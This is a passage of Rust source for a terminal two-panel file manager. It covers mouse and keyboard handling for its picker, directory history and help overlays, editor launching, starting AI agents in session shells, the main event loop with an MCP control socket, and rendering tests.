            return self.mouse_help(m, scroll);
        }
        if let Mode::History { selected } = self.mode {
            return self.mouse_history(m, selected);
        }
        let Mode::Picker { selected } = self.mode else {
            return;
        };
        let catalog = dmac_fx::catalog();
        let rows = crate::ui::picker::row_count(catalog);
        let area = self.layout.picker;

        match m.kind {
            MouseEventKind::ScrollUp => {
                self.mode = Mode::Picker {
                    selected: (selected + rows - 1) % rows,
                }
            }
            MouseEventKind::ScrollDown => {
                self.mode = Mode::Picker {
                    selected: (selected + 1) % rows,
                }
            }

            MouseEventKind::Down(MouseButton::Left) => {
                let inside = area.width > 0
                    && m.column >= area.x
                    && m.column < area.x + area.width
                    && m.row >= area.y
                    && m.row < area.y + area.height;

                if !inside {
                    // Clicking outside a menu closes it. Every other program does
                    // this, and a menu you can only escape with Esc feels stuck.
                    self.mode = Mode::Normal;
                    return;
                }

                // The games separator is a row but not a choice, so this maps
                // through the same helper the renderer uses.
                let clicked = (m.row - area.y) as usize;
                if let Some(index) = crate::ui::picker::index_at_row(catalog, clicked) {
                    if index == selected {
                        self.start_picked(index); // click the highlighted row to start
                    } else {
                        self.mode = Mode::Picker { selected: index };
                    }
                }
            }

            _ => {}
        }
    }

    fn activate(&mut self) {
        let i = Self::idx(self.ses().active);
        let Some(entry) = self.ses().panels[i].current() else {
            return;
        };

        match entry.kind {
            dmac_core::EntryKind::Parent => self.go_parent(),
            dmac_core::EntryKind::Dir => {
                // `join` rejects traversal, so a hostile listing entry named
                // `../..` cannot walk us out of the tree.
                if let Some(next) = self.ses().cwd[i].join(&entry.name) {
                    self.go_to(next);
                } else {
                    self.status = format!("refusing to enter suspicious name: {}", entry.name);
                }
            }
            _ => {
                self.status = format!("open {} — not wired up yet", entry.name);
            }
        }
    }

    fn go_parent(&mut self) {
        let i = Self::idx(self.ses().active);
        if let Some(parent) = self.ses().cwd[i].parent() {
            self.go_to(parent);
        }
    }

    /// Take the active panel somewhere, and remember that we went.
    ///
    /// Every navigation goes through here. One door means the history cannot
    /// quietly miss a route into a directory, which is exactly how a history
    /// ends up with holes nobody can explain.
    pub(crate) fn go_to(&mut self, path: VfsPath) {
        let index = self.sessions.current_index();
        let panel = self.ses().active;
        self.go_to_panel(index, panel, path);
    }

    /// The general form: any panel, of any session. What the panel-aware
    /// callers use — an agent may move the panel it is not looking at.
    pub(crate) fn go_to_panel(&mut self, index: usize, panel: PanelId, path: VfsPath) {
        if index >= self.sessions.len() {
            return;
        }
        let current = self.sessions.current_index();
        let i = Self::idx(panel);
        let session = self.sessions.at_mut(index);
        session.cwd[i] = path;
        let (id, display) = (session.id.0, session.cwd[i].display());
        self.reload_session(index, panel);
        self.touch_sessions();
        self.sessions
            .history
            .record(&display, id, dmac_core::history::now());

        // The shell goes where the panels go — from the history, from a jump,
        // from anything that moves this session's active panel. Only this
        // session's, and only its active panel: an agent moving the panel of a
        // session nobody is looking at must not type into that session's shell.
        //
        // Whether anything is actually typed is the shell's own call: a `cd`
        // sent to something that is running is not a command, it is a line
        // handed to whatever has the keyboard. When it declines, nothing is
        // lost — the next `Ctrl-O`, with the shell back at a prompt, does it.
        if index == current {
            let session = self.sessions.at_mut(index);
            if session.active == panel {
                session.follow_panel_cwd();
            }
        }
    }

    /// Record where every session already is. Called once, at startup.
    fn seed_history(&mut self) {
        let now = dmac_core::history::now();
        let seen: Vec<(u64, String)> = self
            .sessions
            .all()
            .iter()
            .flat_map(|s| s.cwd.iter().map(move |p| (s.id.0, p.display())))
            .collect();
        for (session, path) in seen {
            self.sessions.history.record(&path, session, now);
        }
    }

    // --- The directory history. ---------------------------------------------

    fn open_history(&mut self) {
        self.history_filter.clear();
        self.mode = Mode::History { selected: 0 };
    }

    /// The sessions as rows of the same list, most recently used first.
    ///
    /// Shown as `name — directory` so the filter reaches both: typing part of a
    /// name or part of a path finds the session either way, which is the whole
    /// point of putting them in a list you can type at.
    fn session_rows(&self) -> Vec<dmac_core::history::Row> {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        let mut rows: Vec<dmac_core::history::Row> = self
            .sessions
            .all()
            .iter()
            .map(|s| dmac_core::history::Row {
                path: format!(
                    "{} — {}",
                    s.name,
                    s.cwd[Session::index_of(s.active)].display()
                ),
                // `last_used` is an Instant, which has no calendar meaning; the
                // list prints ages, so it wants one anyway.
                at: now.saturating_sub(s.last_used.elapsed().as_secs()),
                hits: 0,
                session: Some(s.id.0),
            })
            .collect();
        // Most recently used first, which is what a session list is for.
        rows.sort_by_key(|r| std::cmp::Reverse(r.at));
        rows
    }

    fn set_history_order(&mut self, order: dmac_core::history::Order) {
        self.history_order = order;
        // Back to the top: the row that was under the cursor means something
        // different in a differently ordered list, and leaving the highlight
        // where it was would silently move it to an unrelated directory.
        self.mode = Mode::History { selected: 0 };
    }

    /// The rows the history is showing, filtered and ranked.
    ///
    /// Recomputed rather than cached: it is a few hundred short strings, and a
    /// cache would be one more thing that can disagree with what is on screen.
    pub(crate) fn history_rows(&self) -> Vec<crate::ui::history::Shown> {
        let session = self.ses().id.0;
        let rows = if self.history_order == dmac_core::history::Order::Sessions {
            self.session_rows()
        } else {
            self.sessions.history.view(self.history_order, session)
        };
        let filter = self.history_filter.as_str();
        let mut scored: Vec<(i32, crate::ui::history::Shown)> = rows
            .into_iter()
            .filter_map(|row| {
                let m = dmac_core::fuzzy::score(filter, &row.path)?;
                Some((
                    m.score,
                    crate::ui::history::Shown {
                        row,
                        hit: m.positions,
                    },
                ))
            })
            .collect();
        // A filtered list is ranked by how well each row matched; an unfiltered
        // one keeps the order the user asked for. The sort is stable, so rows
        // that score the same stay in that order.
        if !filter.is_empty() {
            scored.sort_by_key(|(score, _)| std::cmp::Reverse(*score));
        }
        scored.into_iter().map(|(_, shown)| shown).collect()
    }

    /// Driving the history.
    fn history_key(&mut self, k: KeyEvent, selected: usize) {
        use dmac_core::history::Order;
        let rows = self.history_rows();
        let last = rows.len().saturating_sub(1);
        let ctrl = k.modifiers.contains(KeyModifiers::CONTROL);
        let alt = k.modifiers.contains(KeyModifiers::ALT);

        match k.code {
            KeyCode::Esc | KeyCode::F(10) => self.close_history(),
            // The three orders, on the three keys the bar below says they are on.
            KeyCode::F(1) => self.set_history_order(Order::Recent),
            KeyCode::F(2) => self.set_history_order(Order::Frequent),
            KeyCode::F(3) => self.set_history_order(Order::Session),
            KeyCode::F(4) => self.set_history_order(Order::Sessions),
            // The directory under the cursor, in the editor. The history is
            // where a project you were in an hour ago is easiest to find, so it
            // is the natural place to ask for it to be opened.
            KeyCode::F(5) => self.open_in_editor(selected),
            // ...and one key that reaches all three, for anyone whose terminal
            // eats function keys.
            KeyCode::Tab => self.set_history_order(self.history_order.next()),

            KeyCode::Up => {
                self.mode = Mode::History {
                    selected: selected.saturating_sub(1),
                }
            }
            KeyCode::Down => {
                self.mode = Mode::History {
                    selected: (selected + 1).min(last),
                }
            }
            KeyCode::PageUp => {
                self.mode = Mode::History {
                    selected: selected.saturating_sub(10),
                }
            }
            KeyCode::PageDown => {
                self.mode = Mode::History {
                    selected: (selected + 10).min(last),
                }
            }
            KeyCode::Home => self.mode = Mode::History { selected: 0 },
            KeyCode::End => self.mode = Mode::History { selected: last },

            KeyCode::Enter => {
                if let Some(shown) = rows.get(selected) {
                    // A session row switches to that session; a directory row
                    // goes there. Same list, same keys, two kinds of destination
                    // — and the row itself says which it is.
                    match shown.row.session {
                        Some(id) => {
                            let target = self.sessions.all().iter().position(|s| s.id.0 == id);
                            self.close_history();
                            if let Some(i) = target {
                                self.sessions.switch_to(i);
                                self.after_session_switch();
                            }
                        }
                        None => {
                            let path = VfsPath::local(&shown.row.path);
                            self.close_history();
                            self.go_to(path);
                        }
                    }
                }
            }

            // Typing filters. Every printable character, because a directory
            // name can contain any of them — including the ones that are menu
            // accelerators everywhere else in this program.
            KeyCode::Backspace => {
                self.history_filter.pop();
                self.mode = Mode::History { selected: 0 };
            }
            KeyCode::Char('u') if ctrl => {
                self.history_filter.clear();
                self.mode = Mode::History { selected: 0 };
            }
            KeyCode::Char(c) if !ctrl && !alt => {
                self.history_filter.push(c);
                self.mode = Mode::History { selected: 0 };
            }
            _ => {}
        }
    }

    /// Open the highlighted directory in the editor, and put the two windows
    /// side by side on the screen this terminal is on.
    ///
    /// Four fifths to the editor and one to the commander: the editor is what
    /// you are about to read, and the commander only has to stay legible next
    /// to it. Launching and placing are separate things that fail separately —
    /// an editor that opened but could not be placed has still done the thing
    /// that was asked, and says so rather than reporting a failure.
    fn open_in_editor(&mut self, selected: usize) {
        let dir = match self.editor_target(selected) {
            Ok(dir) => dir,
            Err(why) => {
                self.status = why;
                return;
            }
        };

        self.close_history();
        self.launch_editor(dir);
    }

    /// Start this session's agent in its shell, and show the shell.
    ///
    /// Typed at the shell rather than spawned beside it, so it is the user's
    /// own shell that runs it — with their aliases, their functions and their
    /// `PATH` — and so the line is visible, editable, and in the history like
    /// anything else they typed.
    /// Open a session beside this one, in its group, and start an agent in it.
    ///
    /// A whole session and not a second shell in this one: its own panels, its
    /// own conversation, its own place in the rail. That is what makes it
    /// something you can come back to — a second agent sharing a session would
    /// share the one conversation id, and the two would fight over it on every
    /// restart.
    ///
    /// It starts where this session is looking, because that is what "beside"
    /// means: the same work, another pair of hands.
    fn start_agent_beside(&mut self) {
        let here = self.sessions.current_index();
        let (left, right) = {
            let s = self.ses();
            (s.cwd[0].clone(), s.cwd[1].clone())
        };
        let name = self.beside_name(here);
        let i = self.sessions.create_sibling(here, name, left, right);
        self.ensure_conversations();
        self.reload_session(i, PanelId::Left);
        self.reload_session(i, PanelId::Right);
        self.after_session_switch();
        self.start_agent_here();
    }

    /// A name for a session opened beside `anchor`: the group's name and the
    /// next free number in it.
    ///
    /// Named rather than left blank because the rail identifies sessions by
    /// name and `rename` refuses a duplicate — an unnamed second one would be
    /// refused before it existed. The number counts the group, not the whole
    /// list, so a group reads as `work·2`, `work·3` however many other sessions
    /// are open.
    fn beside_name(&self, anchor: usize) -> String {
        let root = self
            .sessions
            .parent_of(anchor)
            .unwrap_or(anchor)
            .min(self.sessions.len().saturating_sub(1));
        let stem = self
            .sessions
            .get(root)
            .map(|s| {
                s.name
                    .split('\u{00B7}')
                    .next()
                    .unwrap_or(&s.name)
                    .to_string()
            })
            .unwrap_or_else(|| "agent".to_string());
        (2..)
            .map(|n| format!("{stem}\u{00B7}{n}"))
            .find(|candidate| self.sessions.all().iter().all(|s| &s.name != candidate))
            .unwrap_or(stem)
    }

    fn start_agent_here(&mut self) {
        let agent = dmac_session::agent::attached_program();
        let waker = self.waker();
        let (cols, rows) = self.shell_size();
        let session = self.sessions.current_mut();
        let id = session.id.0.to_string();
        let conversation = session.conversation_id().to_string();
        // A session opened beside another starts *in* the mother's history and
        // then diverges — which is what "beside" has to mean, or the second
        // agent has to be told the problem all over again. Only on its first
        // start: once its own conversation exists, coming back to it is an
        // ordinary resume, and forking again would branch a fresh one every
        // time.
        let fork = session
            .parent_conversation
            .clone()
            .filter(|_| session.agent.is_none());
        let line = match fork {
            Some(_) => dmac_session::agent::fork_command(&id, ""),
            None => dmac_session::agent::start_command(&id, &conversation, ""),
        };
        let shell = match session.shell(cols, rows, waker) {
            Ok(shell) => shell,
            Err(e) => {
                self.status = format!("could not start a shell here: {e}");
                return;
            }
        };
        // Into a prompt or not at all. A line typed at something already
        // running is not a command — it is a sentence handed to whatever has
        // the keyboard, and if that is an agent it will answer it.
        if !shell.at_prompt() {
            self.status = format!("the shell here is busy \u{2014} {agent} not started");
            return;
        }
        if let Err(e) = shell.run(&line) {
            self.status = format!("could not start {agent}: {e}");
            return;
        }
        session.view = View::Shell;
        self.status = if line == agent {
            format!("started {agent}")
        } else {
            format!("started {agent} \u{2014} it can see this commander")
        };
    }

    /// The same, for the directory the active panel is showing — the utilities
    /// menu's route to it, for when you are already looking at the place you
    /// want opened and going through the history to name it would be absurd.
    fn open_editor_here(&mut self) {
        match self.editor_here_target() {
            Ok(dir) => self.launch_editor(dir),
            Err(why) => self.status = why,
        }
    }

    /// Where the utilities menu would open the editor. Split out from the
    /// launching so it can be tested without starting anything.
    pub(crate) fn editor_here_target(&self) -> Result<std::path::PathBuf, String> {
        let ses = self.ses();
        let path = &ses.cwd[Self::idx(ses.active)];
        // An editor opens directories on this machine. One inside an archive or
        // on a remote host has no name it could be given.
        if !path.is_local() {
            return Err("the editor can only open local directories".into());
        }
        Ok(path.as_path().to_path_buf())
    }

    /// Launch the editor on `dir` and put the two windows side by side.
    ///
    /// On a task, never here: launching waits on the editor's window appearing,
    /// which takes as long as starting an editor takes.
    fn launch_editor(&mut self, dir: std::path::PathBuf) {
        self.status = format!("opening {} \u{2026}", dir.display());
        let tx = self.tx.clone();
        tokio::task::spawn_blocking(move || {
            let shown = dir.display().to_string();
            // Opening and placing as one act, and one at a time: they are the
            // same request, and three of them at once are three scripts moving
            // the same two windows.
            let update = match dmac_desktop::open_beside(&dir, 4, 5) {
                Err(e) => Update::Editor(Err(format!("{e}"))),
                Ok(dmac_desktop::Opened::Placed) => Update::Editor(Ok(format!("opened {shown}"))),
                // It opened. That is the thing that was asked for, and the
                // windows not moving is worth a line but is not a failure.
                Ok(dmac_desktop::Opened::NotPlaced(why)) => {
                    Update::Editor(Ok(format!("opened {shown} \u{2014} {why}")))
                }
            };
            let _ = tx.send(update);
        });
    }

    /// Which directory a history row means to an editor.
    ///
    /// Split out from the opening so it can be tested without launching
    /// anything: a test that starts the user's editor is a test nobody runs
    /// twice.
    pub(crate) fn editor_target(&mut self, selected: usize) -> Result<std::path::PathBuf, String> {
        let rows = self.history_rows();
        let shown = rows.get(selected).ok_or("nothing there to open")?;
        // A session row names a session, and what to open is where that session
        // is; a directory row is already the answer.
        let path = match shown.row.session {
            Some(id) => self
                .sessions
                .all()
                .iter()
                .find(|s| s.id.0 == id)
                .map(|s| s.cwd[dmac_session::Session::index_of(s.active)].clone())
                .ok_or("that session is gone")?,
            None => VfsPath::local(&shown.row.path),
        };
        // An editor opens directories on this machine. One inside an archive or
        // on a remote host has no name it could be given.
        if !path.is_local() {
            return Err("the editor can only open local directories".into());
        }
        Ok(path.as_path().to_path_buf())
    }

    fn close_history(&mut self) {
        self.history_filter.clear();
        self.mode = Mode::Normal;
    }

    /// Clicking the history: one click highlights, a second on the same row
    /// goes there. The same gesture a panel uses, so there is nothing new to
    /// learn.
    /// The wheel scrolls the help; a click outside it closes it.
    fn mouse_help(&mut self, m: MouseEvent, scroll: usize) {
        let area = self.layout.help;
        let max =
            crate::ui::help::page_len(area.width as usize).saturating_sub(area.height as usize);
        match m.kind {
            MouseEventKind::ScrollUp => {
                self.mode = Mode::Help {
                    scroll: scroll.saturating_sub(3).min(max),
                }
            }
            MouseEventKind::ScrollDown => {
                self.mode = Mode::Help {
                    scroll: (scroll + 3).min(max),
                }
            }
            MouseEventKind::Down(MouseButton::Left) => {
                let inside = area.width > 0
                    && m.column >= area.x
                    && m.column < area.x + area.width
                    && m.row >= area.y
                    && m.row < area.y + area.height;
                if !inside {
                    self.mode = Mode::Normal;
                }
            }
            _ => {}
        }
    }

    fn mouse_history(&mut self, m: MouseEvent, selected: usize) {
        let rows = self.history_rows();
        let last = rows.len().saturating_sub(1);
        let area = self.layout.history;

        match m.kind {
            MouseEventKind::ScrollUp => {
                self.mode = Mode::History {
                    selected: selected.saturating_sub(3),
                }
            }
            MouseEventKind::ScrollDown => {
                self.mode = Mode::History {
                    selected: (selected + 3).min(last),
                }
            }
            MouseEventKind::Down(MouseButton::Left) => {
                let inside = area.width > 0
                    && m.column >= area.x
                    && m.column < area.x + area.width
                    && m.row >= area.y
                    && m.row < area.y + area.height;
                if !inside {
                    // Clicking outside closes it, as it does for every other
                    // overlay here.
                    self.close_history();
                    return;
                }
                let top =
                    crate::ui::history::first_visible(selected, rows.len(), area.height as usize);
                let clicked = top + (m.row - area.y) as usize;
                if clicked > last {
                    return;
                }
                let again = self
                    .last_history_click
                    .is_some_and(|(row, at)| row == clicked && at.elapsed() < DOUBLE_CLICK);
                self.last_history_click = Some((clicked, std::time::Instant::now()));
                self.mode = Mode::History { selected: clicked };
                if again && let Some(shown) = rows.get(clicked) {
                    let path = VfsPath::local(&shown.row.path);
                    self.close_history();
                    self.go_to(path);
                }
            }
            _ => {}
        }
    }
}

/// Translate a terminal key into the backend-agnostic form effects understand.
///
/// `dmac-fx` cannot see a crossterm `KeyEvent` — it sits below the TUI in the
/// layering, and its effects must also run under the GPU backend.
fn effect_key(k: KeyEvent) -> EffectKey {
    match k.code {
        KeyCode::Up => EffectKey::Up,
        KeyCode::Down => EffectKey::Down,
        KeyCode::Left => EffectKey::Left,
        KeyCode::Right => EffectKey::Right,
        KeyCode::Enter => EffectKey::Enter,
        KeyCode::Esc => EffectKey::Esc,
        KeyCode::Char(' ') => EffectKey::Space,
        KeyCode::Char(c) => EffectKey::Char(c),
        _ => EffectKey::Other,
    }
}

/// Run the application until the user quits.
pub async fn run(mut start: Startup) -> anyhow::Result<()> {
    let cursor = start.cursor;
    let restored = start.restored.take();
    let rail_override = start.rail;
    let mut guard = TerminalGuard::enter(cursor)?;

    let (update_tx, mut update_rx) = mpsc::unbounded_channel();
    let mut app = App::new(start, update_tx);

    // Replace the freshly-made session set with what was on disk, if anything,
    // and list every panel of every session — they are all live, so they all
    // need their contents.
    if let Some((sessions, clean_exit)) = restored {
        let count = sessions.len();
        app.sessions = sessions;
        if !clean_exit {
            // Never let a crash pass silently: a layout that looks subtly stale
            // with no explanation is worse than one that says what happened.
            app.status =
                "previous run did not exit cleanly — sessions restored from the last save".into();
        }
        // Only the one on screen; the rest are listed when first visited.
        let _ = count;
        let current = app.sessions.current_index();
        app.ensure_loaded(current);
    } else {
        app.reload(PanelId::Left);
        app.reload(PanelId::Right);
    }
    // Before anything can open a shell. A session restored from a file written
    // by a version that minted these lazily has none yet, and minting it here
    // rather than on the way into a shell is what gets it written.
    app.ensure_conversations();
    // After the restore, never before: a width given on the command line has to
    // win over the saved one, and applying it first would have it overwritten.
    if let Some(w) = rail_override.collapsed {
        app.sessions.rail.collapsed = w;
    }
    if let Some(w) = rail_override.expanded {
        app.sessions.rail.expanded = w.max(1);
    }
    // Where every session already is counts as somewhere we have been. Without
    // this the history is empty on the first press of Ctrl-H, which reads as a
    // feature that does not work rather than one with nothing to say yet.
    app.seed_history();

    // An agent hosted in one of these sessions can drive the commander it is
    // running inside. The socket is named by pid and advertised to hosted
    // shells through the environment, so a `claude` started here finds it
    // without anyone configuring anything.
    let mcp_socket =
        dmac_session::agent_root().map(|root| dmac_mcp::socket_path(&root, std::process::id()));
    if let Some(socket) = mcp_socket.clone() {
        // Sockets left by runs that are no longer here: one file accumulates
        // per run, and a stale one is a path an agent can be pointed at and
        // get nothing from.
        if let Some(root) = dmac_session::agent_root() {
            dmac_mcp::clear_stale_sockets(&root);
            // And the shim directories earlier versions planted: nothing
            // writes them any more, so this is a sweep that runs once and
            // finds nothing ever after.
            dmac_session::agent::clear_shims(&root);
        }
        crate::mcp::listen(socket, app.tx.clone());
    }

    // Input lives on its own thread doing a blocking read. Cheaper and more
    // portable than an async event stream, and it keeps the loop below free of
    // polling timeouts — we redraw when something happens, not on a timer.
    let (input_tx, mut input_rx) = mpsc::unbounded_channel();
    std::thread::spawn(move || {
        while let Ok(ev) = ratatui::crossterm::event::read() {
            if input_tx.send(ev).is_err() {
                break;
            }
        }
    });

    // Nothing of ours is running yet, so the terminal going away — the window
    // closed, the session logged out, a `kill` — has to run the same teardown
    // F10 does. Without this the hosted tree is simply abandoned, which is how
    // an agent survives to hold a conversation the next run will ask for.
    #[cfg(unix)]
    let mut signals = {
        use tokio::signal::unix::{SignalKind, signal};
        let mut set = Vec::new();
        for kind in [
            SignalKind::hangup(),
            SignalKind::terminate(),
            SignalKind::interrupt(),
        ] {
            if let Ok(s) = signal(kind) {
                set.push(s);
            }
        }
        set
    };

    let mut first_frame = true;

    loop {
        // A directory the panels went to while the shell was busy is written
        // here, on the first frame after the prompt comes back. Free when
        // nothing is owed, and there is no timer behind it: the program exiting
        // is what makes the shell print a prompt, and those bytes are what woke
        // this loop.
        app.catch_up_shell_cwd();
        app.before_frame();
        guard.terminal().draw(|f| ui::draw(f, &mut app))?;
        app.sync_shell_size();
        app.watch_agents();
        if first_frame {
            first_frame = false;
            // After the frame, so a cold start still shows something inside its
            // budget and the spawning happens where the user can watch it.
            app.reattach_agents();
            // And the editor this session had open, back where it was. Entering
            // a session does this already; the session you *start* in is never
            // entered, so it would otherwise be the one session that never got
            // its window back.
            app.raise_editor_here();
        }
        // After the frame, never during it: stdout is shared with ratatui and
        // interleaving with a half-written frame corrupts both.
        if let Some(seq) = app.take_terminal_write() {
            use std::io::Write;
            let mut out = std::io::stdout();
            let _ = out.write_all(seq.as_bytes());
            let _ = out.flush();
        }

        // Re-assert the cursor shape, but only on frames that actually show a
        // cursor. Terminals reset DECSCUSR for reasons outside our control, and
        // setting it once at startup is why a blinking cursor silently stops
        // blinking — while emitting it on every frame would spray the sequence
        // at terminals that do not understand it.
        if app.shows_text_cursor() {
            crate::terminal::apply_cursor_style(app.cursor_style);
        }

        // Exactly one timer, and only when something actually needs waking:
        // the idle deadline, or the next animation frame. `None` means we block
        // on input alone and cost nothing at all.
        // One timer for everything that needs waking: the splash expiry and the
        // screensaver, whichever comes first. Still `None` when neither wants one.
        // Writing sessions is debounced, so it contributes a deadline like
        // everything else rather than a timer of its own.
        let save_due = app.flush_sessions();
        let wake = [
            app.splash_until,
            app.screensaver.deadline(),
            app.cursor_deadline(),
            app.shell_deadline(),
            app.help_deadline(),
            save_due,
        ]
        .into_iter()
        .flatten()
        .min();
        let sleep = async {
            match wake {
                Some(at) => tokio::time::sleep_until(at.into()).await,
                None => std::future::pending().await,
            }
        };

        tokio::select! {
            () = sleep => {}   // fall through to redraw the next frame
            Some(ev) = input_rx.recv() => {
                app.on_input(ev);
                // Drain the rest of the burst before redrawing, so holding an
                // arrow key does not queue one full frame per repeat.
                while let Ok(ev) = input_rx.try_recv() {
                    app.on_input(ev);
                }
            }
            Some(update) = update_rx.recv() => {
                app.apply(update);
                while let Ok(u) = update_rx.try_recv() {
                    app.apply(u);
                }
            }
            // Any of the ways a terminal tells an application to go away.
            Some(()) = wait_for_signal(&mut signals) => {
                app.request_quit();
            }
            else => break,
        }

        if app.should_quit {
            break;
        }
    }

    app.save_on_exit();
    // The socket is this process's; leaving it behind would have the next run
    // find a file that answers nobody.
    if let Some(socket) = mcp_socket {
        let _ = std::fs::remove_file(socket);
    }
    Ok(())
}

/// Resolve when any of these signals arrives.
///
/// A helper because `tokio::select!` needs one future, and which signals exist
/// is a platform question that should not be spelled out inside the loop.
#[cfg(unix)]
async fn wait_for_signal(set: &mut [tokio::signal::unix::Signal]) -> Option<()> {
    if set.is_empty() {
        return std::future::pending().await;
    }
    let mut futures: Vec<_> = set.iter_mut().map(|s| Box::pin(s.recv())).collect();
    let (result, _, _) = futures::future::select_all(futures.iter_mut()).await;
    result.map(|_| ())
}

#[cfg(not(unix))]
async fn wait_for_signal(_set: &mut [()]) -> Option<()> {
    std::future::pending().await
}

#[cfg(test)]
impl App {
    /// An App with no terminal and a listing already in place.
    ///
    /// Lives outside `mod tests` so the sibling modules that also need one —
    /// the MCP tools, for instance — are testing the same application the UI
    /// tests are, rather than a second fixture that will drift from it.
    #[cfg(test)]
    pub(crate) fn for_test() -> App {
        let (tx, _rx) = mpsc::unbounded_channel();
        let mut app = App::new(
            Startup {
                session_name: "test".to_string(),
                left: VfsPath::local("/left"),
                right: VfsPath::local("/right"),
                // Tests must never have a screensaver appear mid-assertion, and
                // no splash: it would swallow the first key of every one.
                screensaver: ScreensaverConfig {
                    enabled: false,
                    ..Default::default()
                },
                splash: false,
                cursor: CursorStyle::default(),
                // Tests never touch the real session file.
                store: None,
                restored: None,
                rail: RailOverride::default(),
            },
            tx,
        );
        let mk = |name: &str, kind| dmac_core::Entry {
            name: name.into(),
            kind,
            size: Some(1234),
            modified: None,
            mode: None,
            selected: false,
        };
        use dmac_core::EntryKind::*;
        app.ses_mut().panels[0].set_entries(vec![
            dmac_core::Entry::parent(),
            mk("src", Dir),
            mk("Cargo.toml", File),
            // The two cases that historically tear a panel border.
            mk("日本語のファイル.txt", File),
            mk("👨‍👩‍👧‍👦-family.png", File),
        ]);
        app
    }
}

/// The first line of a compiler's complaint that actually says something.
///
/// `cargo` leads with progress and warnings; the status bar has one line, and
/// spending it on "Compiling dmac-core v0.1.0" helps nobody.
fn first_error(stderr: &str) -> String {
    stderr
        .lines()
        .find(|l| l.starts_with("error"))
        .unwrap_or_else(|| stderr.lines().last().unwrap_or("no output"))
        .trim()
        .chars()
        .take(200)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;

    /// A plain key press, the way the terminal delivers one.
    fn key(code: KeyCode) -> KeyEvent {
        KeyEvent::new(code, KeyModifiers::NONE)
    }

    fn fixture() -> App {
        App::for_test()
    }

    /// Render into a fixed-size buffer and assert nothing panicked and the
    /// frame is exactly the size we asked for. This is the guard that catches
    /// width-calculation regressions before a user sees a broken border.
    #[test]
    fn renders_without_panicking() {
        let mut app = fixture();
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();

        let buf = term.backend().buffer();
        assert_eq!(buf.area.width, 80);
        assert_eq!(buf.area.height, 24);
    }

    /// Every row of every line must be exactly the terminal width. A row that
    /// overflows is what produces the classic "border ate my filename" bug.
    #[test]
    fn no_row_overflows_the_terminal_width() {
        let mut app = fixture();
        for width in [20u16, 40, 80, 200] {
            let mut term = Terminal::new(TestBackend::new(width, 24)).unwrap();
            term.draw(|f| crate::ui::draw(f, &mut app))
                .unwrap_or_else(|e| panic!("draw failed at width {width}: {e}"));
            assert_eq!(term.backend().buffer().area.width, width);
        }
    }

    /// A terminal one cell tall is a real thing during a drag-resize. It must
    /// not panic.
    #[test]
    fn absurd_terminal_sizes_do_not_panic() {
        let mut app = fixture();
        for (w, h) in [(1u16, 1u16), (3, 2), (200, 1), (10, 3)] {
            let mut term = Terminal::new(TestBackend::new(w, h)).unwrap();
            term.draw(|f| crate::ui::draw(f, &mut app))
                .unwrap_or_else(|e| panic!("draw failed at {w}x{h}: {e}"));
        }
    }

    /// The F-key bar is the documentation; if it stops rendering, the app
    /// becomes unusable for anyone who has not memorised it.
    #[test]
    fn fkey_bar_is_always_present() {
        let mut app = fixture();
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();

        let buf = term.backend().buffer();
        let last: String = (0..80).map(|x| buf[(x, 23)].symbol().to_string()).collect();
        assert!(last.contains("Copy"), "F5 must be labelled: {last:?}");
        assert!(last.contains("Quit"), "F10 must be labelled: {last:?}");
    }

    #[test]
    fn f10_quits() {
        let mut app = fixture();
        assert!(!app.should_quit);
        app.handle(Action::Quit);
        assert!(app.should_quit);
    }

    #[test]
    fn tab_switches_the_active_panel() {
        let mut app = fixture();
        assert_eq!(app.ses().active, PanelId::Left);
        app.handle(Action::SwitchPanel);
        assert_eq!(app.ses().active, PanelId::Right);
    }

    // ---- mouse ----

    /// Give the app a plausible layout without going through a real draw.
    fn with_layout(mut app: App) -> App {
        app.layout.panels = [
            Rect {
                x: 1,
                y: 1,
                width: 38,
                height: 10,
            },
            Rect {
                x: 41,
                y: 1,
                width: 38,
                height: 10,
            },
        ];
        app.layout.fkeys = Rect {
            x: 0,
            y: 23,
            width: 80,
            height: 1,
        };
        // A real draw reports the viewport; without it the panel thinks it is
        // one row tall and every scroll offset is wrong.
        app.ses_mut().panels[0].set_viewport(10);
        app.ses_mut().panels[1].set_viewport(10);
        app
    }

    fn click(button: MouseButton, column: u16, row: u16) -> MouseEvent {
        MouseEvent {
            kind: MouseEventKind::Down(button),
            column,
            row,
            modifiers: ratatui::crossterm::event::KeyModifiers::NONE,
        }
    }

    fn drag_to(column: u16, row: u16) -> MouseEvent {
        MouseEvent {
            kind: MouseEventKind::Drag(MouseButton::Left),
            column,
            row,
            modifiers: ratatui::crossterm::event::KeyModifiers::NONE,
        }
    }

    #[test]
    fn a_click_moves_the_cursor_to_the_clicked_row() {
        let mut app = with_layout(fixture());
        app.on_mouse(click(MouseButton::Left, 5, 3)); // interior row 2
        assert_eq!(app.ses().active, PanelId::Left);
        assert_eq!(app.ses_mut().panels[0].cursor(), 2);
    }

    /// Clicking the inactive panel must focus it — otherwise the click acts on
    /// the wrong side, which is the worst possible outcome in a two-panel app.
    /// Clicking the other panel must focus it *even when it is empty* — otherwise
    /// the next keystroke acts on the panel the user just clicked away from.
    #[test]
    fn clicking_the_other_panel_activates_it_even_when_empty() {
        let mut app = with_layout(fixture());
        assert_eq!(app.ses().active, PanelId::Left);
        assert!(app.ses_mut().panels[1].is_empty());
        app.on_mouse(click(MouseButton::Left, 45, 2));
        assert_eq!(app.ses().active, PanelId::Right);
    }

    #[test]
    fn clicking_past_the_last_entry_does_nothing() {
        let mut app = with_layout(fixture());
        app.ses_mut().panels[0].move_to(1);
        app.on_mouse(click(MouseButton::Left, 5, 9)); // below the 5 entries
        assert_eq!(app.ses_mut().panels[0].cursor(), 1, "cursor must not move");
    }

    #[test]
    fn a_right_click_toggles_selection_and_leaves_the_cursor_put() {
        let mut app = with_layout(fixture());
        app.on_mouse(click(MouseButton::Right, 5, 3));
        assert!(app.ses_mut().panels[0].entries[2].selected);
        assert_eq!(
            app.ses_mut().panels[0].cursor(),
            2,
            "the cursor must stay where clicked"
        );
    }

    /// Dragging selects the whole swept range, including rows the mouse jumped
